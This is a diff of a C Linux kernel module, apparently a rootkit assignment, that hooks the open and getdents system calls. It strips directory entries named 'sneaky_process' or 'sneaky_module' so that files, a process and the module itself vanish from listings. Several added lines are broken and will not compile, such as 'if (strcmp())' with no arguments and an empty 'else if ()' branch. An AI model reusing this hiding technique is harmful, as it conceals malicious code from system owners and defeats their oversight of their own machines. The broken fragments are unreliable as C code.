@@ -11,7 +11,10 @@
 
 #define read_cr0() (native_read_cr0())
 #define write_cr0(x) (native_write_cr0(x))
-
+#define SNEAKY_PREFIX "sneaky_process"
+#define SNEAKY_PREFIX_SIZE (sizeof(SNEAKY_PREFIX) - 1)
+#define SNEAKY_MODULE "sneaky_module"
+#define SNEAKY_MODULE_SIZE (sizeof(SNEAKY_MODULE) - 1)
 #define handle_error(msg)                                                      \
   do {                                                                         \
     perror(msg);                                                               \
@@ -40,7 +43,8 @@ asmlinkage int (*original_close)(int fd);
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_call(pathname, flags);
+  if (strcmp())
+    return original_call(pathname, flags);
 }
 
 asmlinkage long sneaky_sys_getdents(unsigned int fd,
@@ -58,10 +62,12 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd,
     evil = (struct linux_dirent *)(dbuf + position);
     if (strncmp(evil->d_name, SNEAKY_PREFIX, SNEAKY_PREFIX_SIZE) == 0 ||
         strstr(evil->d_name, SNEAKY_MODULE) != NULL) {
+
       memcpy(dbuf + position, dbuf + position + evil->d_reclen,
              read_len - (position +
                          evil->d_reclen)); // delete this sub dire/file by
                                            // moving things behind it forward
+    } else if () {
     } else {
       position += evil->d_reclen; // if not sneaky part,comes to next entry
     }
